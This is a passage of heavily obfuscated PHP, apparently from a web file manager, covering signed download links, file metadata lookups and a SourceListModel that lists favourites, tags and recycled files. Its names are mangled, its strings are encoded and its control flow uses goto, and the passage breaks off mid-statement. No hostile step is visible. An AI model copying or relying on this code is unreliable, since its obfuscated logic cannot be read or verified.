$Ëªö¼…à += $ƒè–üó¹; if (strlen($¾§ŒÀÚî) < $ƒè–üó¹) { break; } } fclose($Òê‚›ª‹); return $·ú°Š®; } public function link($ÆŞ•ô‚Å, $ÀÀ÷ˆ©İ = array()) { $—¢Áš†Ş =& $_SERVER[ñ÷§¡å]; $ÆŞ•ô‚Å = trim($ÆŞ•ô‚Å, $—¢Áš†Ş[8]); if (!empty($this->token)) { $Šš¬”´É = strtotime(date($—¢Áš†Ş[1496])); $ÍìÆ¤Ê = substr(md5($this->token . $—¢Áš†Ş[293] . $Šš¬”´É . $—¢Áš†Ş[1497] . $ÆŞ•ô‚Å), 12, 8) . $Šš¬”´É; $ÀÀ÷ˆ©İ[] = $—¢Áš†Ş[1498] . $ÍìÆ¤Ê; } $êÊòú²Ô = !empty($ÀÀ÷ˆ©İ) ? $—¢Áš†Ş[83] . implode($—¢Áš†Ş[293], $ÀÀ÷ˆ©İ) : $—¢Áš†Ş[12]; return $this->getHost() . $—¢Áš†Ş[8] . $ÆŞ•ô‚Å . $êÊòú²Ô; } public function fileOut($ØÆ­Âİ™, $Ú—£‹Ÿ = false, $É¯Ñİ¦Î = false, $ñİ ‚°» = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ØÆ­Âİ™, $Ú—£‹Ÿ, $É¯Ñİ¦Î, $ñİ ‚°»); } if (!$É¯Ñİ¦Î) { $É¯Ñİ¦Î = $this->pathThis($ØÆ­Âİ™); } $ÜÆ¶æÑ× = $Ú—£‹Ÿ ? array($_SERVER[ñ÷§¡å][1499] . rawurlencode($É¯Ñİ¦Î)) : array(); $«œÁÍ´¥ = $this->link($ØÆ­Âİ™, $ÜÆ¶æÑ×); $this->fileOutLink($«œÁÍ´¥); } public function fileOutServer($©•Á˜Ùæ, $©»ëàè = false, $†á×­ = false, $¶ÕØâÆ™ = '') { parent::fileOut($©•Á˜Ùæ, $©»ëàè, $†á×­, $¶ÕØâÆ™); } public function fileOutImage($û‡ı–Ä€, $’›ÕÎ‡‘ = 250) { $ëÅËÑŠ  = $this->link($û‡ı–Ä€ . $_SERVER[ñ÷§¡å][1500] . $’›ÕÎ‡‘); $this->fileOutLink($ëÅËÑŠ ); } public function fileOutImageServer($ÆÍ”´Ïá, $ÑÊ”íªù = 250) { parent::fileOutImage($ÆÍ”´Ïá, $ÑÊ”íªù); } public function hashMd5($» ÒèÔ) { $ìîşÍİ» =& $_SERVER[ñ÷§¡å]; $Èô¸¬ô = $this->_objectMeta($» ÒèÔ); return isset($Èô¸¬ô[$ìîşÍİ»[222]]) ? $Èô¸¬ô[$ìîşÍİ»[222]] : !1; } public function size($²•‚†àß) { $åâ¬“ÑÍ = $this->objectMeta($²•‚†àß); return $åâ¬“ÑÍ ? $åâ¬“ÑÍ[$_SERVER[ñ÷§¡å][86]] : 0; } public function info($Âå‰µ‡Å) { if ($this->isFolder($Âå‰µ‡Å)) { return $this->folderInfo($Âå‰µ‡Å); } else { if ($this->isFile($Âå‰µ‡Å)) { return $this->fileInfo($Âå‰µ‡Å); } } return !1; } public function exist($—¸æÍ Õ) { return $this->isFile($—¸æÍ Õ) || $this->isFolder($—¸æÍ Õ); } public function isFile($Ì“áÔü) { return !$this->isFolder($Ì“áÔü) && $this->objectMeta($Ì“áÔü); } public function isFolder($§Û ÷ÎÊ) { return $this->cacheMethod($_SERVER[ñ÷§¡å][175], $§Û ÷ÎÊ); } protected function objectMeta($¿şâ«‚) { return $this->cacheMethod($_SERVER[ñ÷§¡å][177], $¿şâ«‚); } protected function _objectMeta($×ÍµË¶) { $¡†ñË÷ =& $_SERVER[ñ÷§¡å]; if ($×ÍµË¶ == $¡†ñË÷[12] || $×ÍµË¶ == $¡†ñË÷[8]) { return array(); } $¨°ÔÊ–” = $this->ussRequest($×ÍµË¶, $¡†ñË÷[1501]); if (!$¨°ÔÊ–”[$¡†ñË÷[1198]]) { return null; } $·¾§ÓëÜ = isset($¨°ÔÊ–”[$¡†ñË÷[1200]]) ? $¨°ÔÊ–”[$¡†ñË÷[1200]] : array(); if (!isset($·¾§ÓëÜ[$¡†ñË÷[1502]])) { return null; } $²É •Ê¤ = array($¡†ñË÷[33] => isset($·¾§ÓëÜ[$¡†ñË÷[1502]]) ? $·¾§ÓëÜ[$¡†ñË÷[1502]] : null, $¡†ñË÷[86] => isset($·¾§ÓëÜ[$¡†ñË÷[1503]]) ? $·¾§ÓëÜ[$¡†ñË÷[1503]] : null, $¡†ñË÷[222] => isset($·¾§ÓëÜ[$¡†ñË÷[1504]]) ? $·¾§ÓëÜ[$¡†ñË÷[1504]] : null, $¡†ñË÷[1471] => isset($·¾§ÓëÜ[$¡†ñË÷[1505]]) ? $·¾§ÓëÜ[$¡†ñË÷[1505]] : null); $²É •Ê¤[$¡†ñË÷[1472]] = isset($·¾§ÓëÜ[$¡†ñË÷[1506]]) ? strtotime($·¾§ÓëÜ[$¡†ñË÷[1506]]) : $²É •Ê¤[$¡†ñË÷[1471]]; return $²É •Ê¤; } protected function _isFolder($¯Ä«Ü ­) { $Ó…•ÂÇı =& $_SERVER[ñ÷§¡å]; if ($¯Ä«Ü ­ == $Ó…•ÂÇı[12] || $¯Ä«Ü ­ == $Ó…•ÂÇı[8]) { return !0; } $ñéÉñ«Š = $this->_objectMeta($¯Ä«Ü ­); return isset($ñéÉñ«Š[$Ó…•ÂÇı[33]]) && $ñéÉñ«Š[$Ó…•ÂÇı[33]] == $Ó…•ÂÇı[85] ? !0 : !1; } } goto AÙ³»ÔôÅù; Aœ×ªñø‡¼: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\155\145" => "\151\x6f\137\x73\x6f\165\162\x63\145\x5f\155\145\x74\x61", "\x6d\x65\x74\141\106\x69\145\154\x64" => "\163\157\x75\162\x63\x65\111\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\x54\x69\x6d\145", "\164\151\155\145", "\151\x6e\163\x65\x72\164", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\143\x72\x65\x61\x74\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\164", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\166\151\145\x77\124\x69\155\x65", "\x74\151\155\145", "\151\x6e\x73\145\162\x74", "\146\x75\156\143\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ã·õºˆà) { return $this->listSource(array($_SERVER[ñ÷§¡å][410] => $Ã·õºˆà)); } public function typeName($‘ˆè››) { static $ Æå´Ù˜ = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $ Æå´Ù˜[$‘ˆè›› . $_SERVER[ñ÷§¡å][12]]; } public function sourceListInfo($Ñ¦¡¶ÜÛ, $ä‡À¡Ü× = false) { $±öµıËõ =& $_SERVER[ñ÷§¡å]; $Ñ¦¡¶ÜÛ = $Ñ¦¡¶ÜÛ ? $Ñ¦¡¶ÜÛ : array(); $Ñ¦¡¶ÜÛ = array_filter(array_unique($Ñ¦¡¶ÜÛ)); if (!$Ñ¦¡¶ÜÛ) { return array(); } $œ¬Ğª = $this->where(array($±öµıËõ[411] => array($±öµıËõ[7], $Ñ¦¡¶ÜÛ)))->select(); $this->_listDataApply($œ¬Ğª, $ä‡À¡Ü×); return array_to_keyvalue($œ¬Ğª, $±öµıËõ[411]); } public function pathInfoFilter(&$¿×­ÖÆ›) { $şæ¦†ˆ =& $_SERVER[ñ÷§¡å]; static $Ú„Ï½¤¤ = false; static $Ó¹ëù = false; static $·Ø‰›Õ = false; if (!$Ú„Ï½¤¤) { $¦Ü›™”ó = $şæ¦†ˆ[412]; $¦Ü›™”ó .= $şæ¦†ˆ[413]; $¦Ü›™”ó .= $şæ¦†ˆ[414]; $•¸İÂé = $şæ¦†ˆ[415]; $Ñ‹ÊÌ¥ˆ = explode($şæ¦†ˆ[50], $•¸İÂé); $Ú„Ï½¤¤ = explode($şæ¦†ˆ[50], $¦Ü›™”ó); $Ó¹ëù = array(); foreach ($Ú„Ï½¤¤ as $Î·ƒãÄÚ) { if (in_array($Î·ƒãÄÚ, $Ñ‹ÊÌ¥ˆ)) { continue; } $Ó¹ëù[] = $Î·ƒãÄÚ; } $·Ø‰›Õ = explode($şæ¦†ˆ[50], $şæ¦†ˆ[416]); } foreach ($·Ø‰›Õ as $€¯¹ ›è) { if (isset($¿×­ÖÆ›[$€¯¹ ›è])) { $¿×­ÖÆ›[$€¯¹ ›è] = intval($¿×­ÖÆ›[$€¯¹ ›è]); } } $¿×­ÖÆ›[$şæ¦†ˆ[94]] = $şæ¦†ˆ[417] . $¿×­ÖÆ›[$şæ¦†ˆ[411]] . $şæ¦†ˆ[418]; $¿×­ÖÆ›[$şæ¦†ˆ[33]] = $¿×­ÖÆ›[$şæ¦†ˆ[419]] == 1 ? $şæ¦†ˆ[85] : $şæ¦†ˆ[209]; $¿×­ÖÆ›[$şæ¦†ˆ[420]] = $this->typeName($¿×­ÖÆ›[$şæ¦†ˆ[420]]); if ($¿×­ÖÆ›[$şæ¦†ˆ[419]] != 1) { $¿×­ÖÆ›[$şæ¦†ˆ[184]] = $¿×­ÖÆ›[$şæ¦†ˆ[421]]; unset($¿×­ÖÆ›[$şæ¦†ˆ[421]]); } $ÌÈ¬µ¤Ò = $Ú„Ï½¤¤; if (isset($¿×­ÖÆ›[$şæ¦†ˆ[422]]) && $¿×­ÖÆ›[$şæ¦†ˆ[422]][$şæ¦†ˆ[423]] == -1) { $ÌÈ¬µ¤Ò = $Ó¹ëù; } $¿×­ÖÆ› = array_field_key($¿×­ÖÆ›, $ÌÈ¬µ¤Ò); return $¿×­ÖÆ›; } public function listUserFav() { $èğÅ€… =& $_SERVER[ñ÷§¡å]; $–õİÖ§ = Model($èğÅ€…[424])->listData(); $ûÊø€¶ç = array_filter_by_field($–õİÖ§, $èğÅ€…[33], $èğÅ€…[425]); $ûÊø€¶ç = array_to_keyvalue($ûÊø€¶ç, $èğÅ€…[12], $èğÅ€…[94]); if ($ûÊø€¶ç) { $¶’²É×æ = $this->listSource(array($èğÅ€…[426] => array($èğÅ€…[427], $ûÊø€¶ç))); } $¶’²É×æ = array_to_keyvalue($¶’²É×æ[$èğÅ€…[378]], $èğÅ€…[411]); foreach ($–õİÖ§ as &$ø·Äšµ¥) { $ø·Äšµ¥ = array($èğÅ€…[428] => $ø·Äšµ¥[$èğÅ€…[408]], $èğÅ€…[429] => $ø·Äšµ¥[$èğÅ€…[32]], $èğÅ€…[430] => $ø·Äšµ¥[$èğÅ€…[94]], $èğÅ€…[431] => $ø·Äšµ¥[$èğÅ€…[33]], $èğÅ€…[432] => $ø·Äšµ¥[$èğÅ€…[210]], $èğÅ€…[433] => $ø·Äšµ¥[$èğÅ€…[95]]); if ($ø·Äšµ¥[$èğÅ€…[33]] == $èğÅ€…[425] && $¶’²É×æ[$ø·Äšµ¥[$èğÅ€…[94]]]) { $ø·Äšµ¥[$èğÅ€…[96]] = $¶’²É×æ[$ø·Äšµ¥[$èğÅ€…[94]]]; } } unset($ø·Äšµ¥); return $–õİÖ§; } public function listUserTag($Ö¬ù¿œù) { $»Ÿû Ç =& $_SERVER[ñ÷§¡å]; if ($Ö¬ù¿œù && !is_array($Ö¬ù¿œù)) { $Ö¬ù¿œù = array($Ö¬ù¿œù); } $£é’ĞÁ = Model($»Ÿû Ç[434])->listData(); $çøËòÉ± = array(); $¯êöÊÏ‡ = array(); foreach ($£é’ĞÁ as $èòéö) { $ùŒğ›æ® = $èòéö[$»Ÿû Ç[94]]; if (!$ùŒğ›æ®) { continue; } if (!isset($¯êöÊÏ‡[$ùŒğ›æ®])) { $¯êöÊÏ‡[$ùŒğ›æ®] = array(); } $¯êöÊÏ‡[$ùŒğ›æ®][] = $èòéö[$»Ÿû Ç[435]]; $çøËòÉ±[$èòéö[$»Ÿû Ç[94]]] = $èòéö; } $ÁŸ ß£É = array(); $¢€ÏÎ¦ö = array(); $ŒğõÊ…Í = array(); foreach ($¯êöÊÏ‡ as $œ†õŒóÂ => $×òÔ”ˆ) { $ÔœõÜŸ„ = !0; if (!$Ö¬ù¿œù) { $ÁŸ ß£É[] = $œ†õŒóÂ; continue; } foreach ($Ö¬ù¿œù as $¬Ç¥ëóÑ) { if (!in_array($¬Ç¥ëóÑ, $×òÔ”ˆ)) { $ÔœõÜŸ„ = !1; break; } } if (!$ÔœõÜŸ„) { continue; } if (!is_numeric($œ†õŒóÂ)) { $×ÅĞëø˜ = $çøËòÉ±[$œ†õŒóÂ]; $ûÛãµÂš = array($»Ÿû Ç[32] => $×ÅĞëø˜[$»Ÿû Ç[32]], $»Ÿû Ç[94] => $×ÅĞëø˜[$»Ÿû Ç[94]], $»Ÿû Ç[33] => $×ÅĞëø˜[$»Ÿû Ç[33]], $»Ÿû Ç[96] => array($»Ÿû Ç[436] => 1), $»Ÿû Ç[211] => !0); if ($×ÅĞëø˜[$»Ÿû Ç[33]] == $»Ÿû Ç[209]) { $ŒğõÊ…Í[] = $ûÛãµÂš; } if ($×ÅĞëø˜[$»Ÿû Ç[33]] == $»Ÿû Ç[85]) { $¢€ÏÎ¦ö[] = $ûÛãµÂš; } continue; } $ÁŸ ß£É[] = $œ†õŒóÂ; } if ($ÁŸ ß£É) { $ÚÉï¼¤ = $this->listSource(array($»Ÿû Ç[426] => array($»Ÿû Ç[427], $ÁŸ ß£É))); } $ÚÉï¼¤ = $ÚÉï¼¤ ? $ÚÉï¼¤ : array($»Ÿû Ç[92] => array(), $»Ÿû Ç[93] => array()); $ÚÉï¼¤[$»Ÿû Ç[92]] = array_merge($ÚÉï¼¤[$»Ÿû Ç[92]], $¢€ÏÎ¦ö); $ÚÉï¼¤[$»Ÿû Ç[93]] = array_merge($ÚÉï¼¤[$»Ÿû Ç[93]], $ŒğõÊ…Í); if (isset($ÚÉï¼¤[$»Ÿû Ç[375]]) && count($ÁŸ ß£É) == $ÚÉï¼¤[$»Ÿû Ç[375]][$»Ÿû Ç[376]]) { return $ÚÉï¼¤; } $³”×ìË = array(); $Œšö«é = array_to_keyvalue($ÚÉï¼¤[$»Ÿû Ç[92]], $»Ÿû Ç[12], $»Ÿû Ç[411]); $·Å®ÓÒ² = array_to_keyvalue($ÚÉï¼¤[$»Ÿû Ç[93]], $»Ÿû Ç[12], $»Ÿû Ç[411]); $¡¶Õøó¦ = array_merge($·Å®ÓÒ², $Œšö«é); foreach ($ÁŸ ß£É as $ùŒğ›æ®) { if (!in_array($ùŒğ›æ®, $¡¶Õøó¦)) { $³”×ìË[] = $ùŒğ›æ®; } } if ($³”×ìË) { Model($»Ÿû Ç[437])->removeBySource($³”×ìË); } return $ÚÉï¼¤; } public function listUserRecycle() { $ª…ä‘§æ =& $_SERVER[ñ÷§¡å]; $éãå¤ğ = Model($ª…ä‘§æ[438])->listData(); if (!$éãå¤ğ) { return array(); } $•éÚœ½ú = array($ª…ä‘§æ[426] => array($ª…ä‘§æ[427], $éãå¤ğ), $ª…ä‘§æ[439] => 1); return $this->listSource($•éÚœ½ú); } public function listSource($ïìÛ«, $ë­ï®¢ö = 3000, $ïìèıûµ = false) { $Ø˜·‰§¾ =& $_SERVER[ñ÷§¡å]; if (!isset($ïìÛ«[$Ø˜·‰§¾[440]])) { $ïìÛ«[$Ø˜·‰§¾[440]] = 0; } if (isset($ïìÛ«[$Ø˜·‰§¾[441]]) && $ïìÛ«[$Ø˜·‰§¾[441]] == $Ø˜·‰§¾[207]) { $ïìÛ«[$Ø˜·‰§¾[421]] = array($Ø˜·‰§¾[340], $Ø˜·‰§¾[442]); } $€²È¥Ù– = $Ø˜·‰§¾[443]; $áÀÌõ’ = $this->field($€²È¥Ù–)->_makeOrder()->where($ïìÛ«)->selectPage($ë­ï®¢ö); $this->_listPageCheck($áÀÌõ’, $€²È¥Ù–, $ïìÛ«); $this->_listDataApply($áÀÌõ’[$Ø˜·‰§¾[378]], $ïìèıûµ); $this->_listMake($áÀÌõ’); return $áÀÌõ’; } private function _listPageCheck(&$•¡¨ãû, $“›¼šè, $´ ›¬šè) { $Ö¥§—± =& $_SERVER[ñ÷§¡å]; if (!is_array($•¡¨ãû[$Ö¥§—±[375]])) { return; } $¦š…ĞÀ¹ = $•¡¨ãû[$Ö¥§—±[375]]; if ($¦š…ĞÀ¹[$Ö¥§—±[377]] <= 1) { return; } if ($¦š…ĞÀ¹[$Ö¥§—±[376]] >= 100000) { return; } if (Model($Ö¥§—±[444])->get($Ö¥§—±[445]) != $Ö¥§—±[446]) { return; } $“›¼šè = str_replace(array($Ö¥§—±[53], $Ö¥§—±[351], $Ö¥§—±[65]), $Ö¥§—±[12], $“›¼šè); $“›¼šè = $Ö¥§—±[447] . str_replace($Ö¥§—±[50], $Ö¥§—±[448], $“›¼šè) . $Ö¥§—±[449]; $”‘Ğ½ÆÄ = $Ö¥§—±[450]; $”‘Ğ½ÆÄ = $”‘Ğ½ÆÄ . $Ö¥§—±[451]; $ÍÇéÉè¾ = $¦š…ĞÀ¹[$Ö¥§—±[372]] * ($¦š…ĞÀ¹[$Ö¥§—±[362]] - 1) . $Ö¥§—±[50] . $¦š…ĞÀ¹[$Ö¥§—±[372]]; $÷Ô†ÙşÂ = $this->_makeOrder(!0); $„‡§ìÎè = $Ö¥§—±[447] . str_replace($Ö¥§—±[50], $Ö¥§—±[448], $÷Ô†ÙşÂ[0]); if (strpos($„‡§ìÎè, $Ö¥§—±[452])) { $„‡§ìÎè = str_replace($Ö¥§—±[452], $Ö¥§—±[453], $„‡§ìÎè); } else { $„‡§ìÎè .= $Ö¥§—±[454] . $÷Ô†ÙşÂ[1]; } $…Èşœ¦• = array(); foreach ($´ ›¬šè as $ßûß…É‘ => $ã†–õ’ö) { $…Èşœ¦•[$Ö¥§—±[447] . $ßûß…É‘] = $ã†–õ’ö; } $this->alias($Ö¥§—±[455])->field($“›¼šè)->limit($ÍÇéÉè¾)->order($„‡§ìÎè); $ñÏéğ—Â = $this->join($”‘Ğ½ÆÄ)->where($…Èşœ¦•)->select(); if ($ñÏéğ—Â) { $•¡¨ãû[$Ö¥§—±[378]] = $ñÏéğ—Â; } } protected function _makeOrder($¡Ú˜Ï÷Ø = false) { $ÙÖ‚ö‡Â =& $_SERVER[ñ÷§¡å]; $»‰›¾Ê° = Model($ÙÖ‚ö‡Â[456])->get($ÙÖ‚ö‡Â[457]); $ æ­ˆ‘Ã = Model($ÙÖ‚ö‡Â[456])->get($ÙÖ‚ö‡Â[458]); $µĞÏ†ƒË = array($ÙÖ‚ö‡Â[459] => $ÙÖ‚ö‡Â[460], $ÙÖ‚ö‡Â[461] => $ÙÖ‚ö‡Â[462]); $Û˜àÙ•‡ = array($ÙÖ‚ö‡Â[32] => $ÙÖ‚ö‡Â[32], $ÙÖ‚ö‡Â[86] => $ÙÖ‚ö‡Â[86], $ÙÖ‚ö‡Â[184] => $ÙÖ‚ö‡Â[421], $ÙÖ‚ö‡Â[463] => $ÙÖ‚ö‡Â[463], $ÙÖ‚ö‡Â[464] => $ÙÖ‚ö‡Â[465], $ÙÖ‚ö‡Â[210] => $ÙÖ‚ö‡Â[210], $ÙÖ‚ö‡Â[95] => $ÙÖ‚ö‡Â[95]); $¶°ı¢ƒ‰ = Input::get($ÙÖ‚ö‡Â[466], $ÙÖ‚ö‡Â[7], $»‰›¾Ê°, array_keys($Û˜àÙ•‡)); $âÉ—®œ = Input::get($ÙÖ‚ö‡Â[467], $ÙÖ‚ö‡Â[7], $ æ­ˆ‘Ã, array_keys($µĞÏ†ƒË)); if (!in_array($¶°ı¢ƒ‰, array_keys($Û˜àÙ•‡))) { $¶°ı¢ƒ‰ = $ÙÖ‚ö‡Â[32]; } if (!in_array($âÉ—®œ, array_keys($µĞÏ†ƒË))) { $¶°ı¢ƒ‰ = $ÙÖ‚ö‡Â[459]; } if ($¶°ı¢ƒ‰ == $ÙÖ‚ö‡Â[32]) { } $­¾ïò = $ÙÖ‚ö‡Â[468] . $Û˜àÙ•‡[$¶°ı¢ƒ‰] . $ÙÖ‚ö‡Â[53] . $µĞÏ†ƒË[$âÉ—®œ]; $­¾ïò = rtrim(trim($­¾ïò), $ÙÖ‚ö‡Â[50]); if ($¡Ú˜Ï÷Ø) { return array($­¾ïò, $µĞÏ†ƒË[$âÉ—®œ]); } return $this->order($­¾ïò); } protected function _listDataApplyItem($ıÕ˜Îê†, $óüøŠºÓ = false) { $û‰´‚÷„ = array($ıÕ˜Îê†); $this->_listDataApply($û‰´‚÷„, $óüøŠºÓ); return $û‰´‚÷„[0]; } protected function _listDataApply(&$µ¿Ãş‡à, $Ò…ÏááÎ = false) { $ÉøÍùàÑ =& $_SERVER[ñ÷§¡å]; if (!$µ¿Ãş‡à) { $µ¿Ãş‡à = array(); return; } $Ş»ªÃãÔ = array_to_keyvalue($µ¿Ãş‡à, $ÉøÍùàÑ[12], $ÉøÍùàÑ[411]); $Ş»ªÃãÔ = array_unique($Ş»ªÃãÔ); $this->_listSourceCache($µ¿Ãş‡à); if (!$Ò…ÏááÎ) { $this->_listAppendMeta($µ¿Ãş‡à, $Ş»ªÃãÔ); $this->_listAppendFileMeta($µ¿Ãş‡à, $Ş»ªÃãÔ); $this->_listAppendChildren($µ¿Ãş‡à, $Ş»ªÃãÔ); } $this->_listAppendPath($µ¿Ãş‡à); $this->_listAppendAuth($µ¿Ãş‡à); $this->_listAppendSourceInfo($µ¿Ãş‡à, $Ş»ªÃãÔ); $this->_listAppendUser($µ¿Ãş‡à); $this->_listFilterInfo($µ¿Ãş‡à, $Ò…ÏááÎ); $this->_listAppendAuthSecret($µ¿Ãş‡à); } protected function _listSourceCache($ ÷Ô”Ÿ¾) { $Ãè™†¹¦ =& $_SERVER[ñ÷§¡å]; foreach ($ ÷Ô”Ÿ¾ as $¼¦’“”„) { self::$cacheSourceInfo[$Ãè™†¹¦[469] . $¼¦’“”„[$Ãè™†¹¦[411]]] = $¼¦’“”„; } } protected function _listFilterInfo(&$ãøùçÂ¤, $ó‘å¦¼ê = false) { $Ñê›Šªà =& $_SERVER[ñ÷§¡å]; foreach ($ãøùçÂ¤ as &$Â²·µÊÉ) { $Â²·µÊÉ = $this->pathInfoFilter($Â²·µÊÉ); self::$cachePathInfo[$Ñê›Šªà[470] . intval($ó‘å¦¼ê) . $Ñê›Šªà[395] . $Â²·µÊÉ[$Ñê›Šªà[411]]] = $Â²·µÊÉ; } unset($Â²·µÊÉ); } protected function _listMake(&$‰™’îÇ) { $ı·©˜ÚÉ =& $_SERVER[ñ÷§¡å]; $‰™’îÇ[$ı·©˜ÚÉ[92]] = array(); $‰™’îÇ[$ı·©˜ÚÉ[93]] = array(); foreach ($‰™’îÇ[$ı·©˜ÚÉ[378]] as $ÄĞù¥¾) { $»í´ş©î = $ÄĞù¥¾[$ı·©˜ÚÉ[419]] == 1 ? $ı·©˜ÚÉ[92] : $ı·©˜ÚÉ[93]; $‰™’îÇ[$»í´ş©î][] = $ÄĞù¥¾; } unset($‰™’îÇ[$ı·©˜ÚÉ[378]]); } protected function _listAppendMeta(&$ˆ—™æ‹Š, $½óøÅæÒ) { $Ù‘Á–÷Ú =& $_SERVER[ñ÷§¡å]; $ÎŒÄùÊ‰ = array($Ù‘Á–÷Ú[426] => array($Ù‘Á–÷Ú[427], $½óøÅæÒ)); $Ø•ƒ¯¯ = Model($Ù‘Á–÷Ú[471])->field($Ù‘Á–÷Ú[472])->where($ÎŒÄùÊ‰)->select(); if (!$Ø•ƒ¯¯) { return; } $ÙêÎ‹â = array($Ù‘Á–÷Ú[473], $Ù‘Á–÷Ú[474], $Ù‘Á–÷Ú[453]); $â™÷ÄŠ¨ = array(); foreach ($Ø•ƒ¯¯ as $¥Ûİ‹Ì·) { if (!isset($â™÷ÄŠ¨[$¥Ûİ‹Ì·[$Ù‘Á–÷Ú[411]]])) { $â™÷ÄŠ¨[$¥Ûİ‹Ì·[$Ù‘Á–÷Ú[411]]] = array(); } if (in_array($¥Ûİ‹Ì·[$Ù‘Á–÷Ú[104]], $ÙêÎ‹â)) { continue; } $â™÷ÄŠ¨[$¥Ûİ‹Ì·[$Ù‘Á–÷Ú[411]]][$¥Ûİ‹Ì·[$Ù‘Á–÷Ú[104]]] = $¥Ûİ‹Ì·[$Ù‘Á–÷Ú[383]]; } foreach ($ˆ—™æ‹Š as &$Ã¯Ï»Ù¼) { $Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[475]] = !1; if (isset($â™÷ÄŠ¨[$Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[411]]])) { $Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[475]] = $â™÷ÄŠ¨[$Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[411]]]; } if ($this->fileIsLock($Ã¯Ï»Ù¼) && $Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[422]]) { $©¡ó¾Ò« = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[422]][$Ù‘Á–÷Ú[423]] = AuthModel::authDisable($Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[422]][$Ù‘Á–÷Ú[423]], $©¡ó¾Ò«); $Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[422]][$Ù‘Á–÷Ú[476]][$Ù‘Á–÷Ú[422]] = $Ã¯Ï»Ù¼[$Ù‘Á–÷Ú[422]][$Ù‘Á–÷Ú[423]]; } } unset($Ã¯Ï»Ù¼); } protected function _listAppendFileMeta(&$İ¥Ü„Ì¡, $©Ö•ğáä) { $ÒÆıãÁË =& $_SERVER[ñ÷§¡å]; $ÕİÉé©Î = array_to_keyvalue($İ¥Ü„Ì¡, $ÒÆıãÁË[12], $ÒÆıãÁË[477]); $ÕİÉé©Î = array_filter(array_unique($ÕİÉé©Î)); if (!$ÕİÉé©Î) { return; } $Ñ¸ø›Û‰ = array($ÒÆıãÁË[478] => array($ÒÆıãÁË[427], $ÕİÉé©Î)); $Ô°ìËÔı = $ÒÆıãÁË[479]; $¼ˆæ¨êÑ = Model($ÒÆıãÁË[480])->field($Ô°ìËÔı)->where($Ñ¸ø›Û‰)->select(); $¼ˆæ¨êÑ = array_to_keyvalue($¼ˆæ¨êÑ, $ÒÆıãÁË[477]); $™†¯á‘× = Model($ÒÆıãÁË[481])->field($ÒÆıãÁË[482])->where($Ñ¸ø›Û‰)->select(); $™†¯á‘× = $™†¯á‘× ? $™†¯á‘× : array(); $úŞëÖÔ™ = array(); foreach ($™†¯á‘× as $¾ îÍš) { if (!isset($úŞëÖÔ™[$¾ îÍš[$ÒÆıãÁË[477]]])) { $úŞëÖÔ™[$¾ îÍš[$ÒÆıãÁË[477]]] = array(); } $úŞëÖÔ™[$¾ îÍš[$ÒÆıãÁË[477]]][$¾ îÍš[$ÒÆıãÁË[104]]] = $¾ îÍš[$ÒÆıãÁË[383]]; } foreach ($İ¥Ü„Ì¡ as &$‚’•×¹å) { $ÖşîÏ¼œ = $‚’•×¹å[$ÒÆıãÁË[477]]; if (!$ÖşîÏ¼œ || !is_array($¼ˆæ¨êÑ[$ÖşîÏ¼œ])) { continue; } $«í“›îŒ = $¼ˆæ¨êÑ[$ÖşîÏ¼œ]; $«í“›îŒ[$ÒÆıãÁË[86]] = $‚’•×¹å[$ÒÆıãÁË[86]]; $«í“›îŒ[$ÒÆıãÁË[32]] = $‚’•×¹å[$ÒÆıãÁË[32]]; if (!isset(self::$cacheFileInfo[$ÒÆıãÁË[483] . $ÖşîÏ¼œ])) { self::$cacheFileInfo[$ÒÆıãÁË[483] . $ÖşîÏ¼œ] = array_merge(array(), $«í“›îŒ); } unset($¼ˆæ¨êÑ[$ÖşîÏ¼œ][$ÒÆıãÁË[94]]); $±­ï·ÒØ = is_array($úŞëÖÔ™[$ÖşîÏ¼œ]) ? $úŞëÖÔ™[$ÖşîÏ¼œ] : array(); $‚’•×¹å[$ÒÆıãÁË[180]] = array_merge($±­ï·ÒØ, $¼ˆæ¨êÑ[$ÖşîÏ¼œ]); if (isset($‚’•×¹å[$ÒÆıãÁË[180]][$ÒÆıãÁË[179]])) { $‚’•×¹å[$ÒÆıãÁË[179]] = json_decode($‚’•×¹å[$ÒÆıãÁË[180]][$ÒÆıãÁË[179]], !0); unset($‚’•×¹å[$ÒÆıãÁË[180]][$ÒÆıãÁË[179]]); } } unset($‚’•×¹å); } protected function _listAppendSourceInfo(&$×É¯Ì, $õŞÉ’) { $Éî™üè€ =& $_SERVER[ñ÷§¡å]; if (!defined($Éî™üè€[484])) { return; } $ü‚ƒ‡ÂÉ = Model($Éî™üè€[485])->listData(); $„¯‡‹ = Model($Éî™üè€[434])->listData(); $¦·Şú£á = Model($Éî™üè€[424])->listData(); $¢¢îàˆµ = Model($Éî™üè€[486])->listSimple(); $°¾—¤÷½ = array_to_keyvalue($ü‚ƒ‡ÂÉ, $Éî™üè€[408]); $¤Ô‰Æ·ü = array_to_keyvalue_group($„¯‡‹, $Éî™üè€[94], $Éî™üè€[435]); $É€¿ù¦ = array_to_keyvalue($¦·Şú£á, $Éî™üè€[94]); $µ«ğÆœá = array_to_keyvalue_group($¢¢îàˆµ, $Éî™üè€[411]); foreach ($×É¯Ì as &$’ğÁˆöª) { $’ğÁˆöª[$Éî™üè€[96]] = array($Éî™üè€[487] => 0, $Éî™üè€[488] => 0, $Éî™üè€[489] => 0); if 